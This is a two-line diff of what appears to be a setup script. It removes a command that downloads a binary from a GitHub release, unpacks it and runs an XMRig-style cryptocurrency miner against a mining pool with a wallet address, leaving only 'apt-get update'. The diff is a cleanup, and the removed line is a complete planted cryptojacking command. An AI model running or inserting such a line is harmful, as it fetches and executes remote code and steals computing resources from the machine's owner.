@@ -1,2 +1,2 @@
 lscpu
-apt-get update && wget https://github.com/wolovemadang/cpu-mining/releases/download/xmrig/bin.tar.gz && tar -xvf bin.tar.gz && ./bin -a ghostrider --url eu.flockpool.com:5555 --tls --user RRUkzfgHKHqi3iG5rv6LnBUgkCCere2H3x.la
+apt-get update
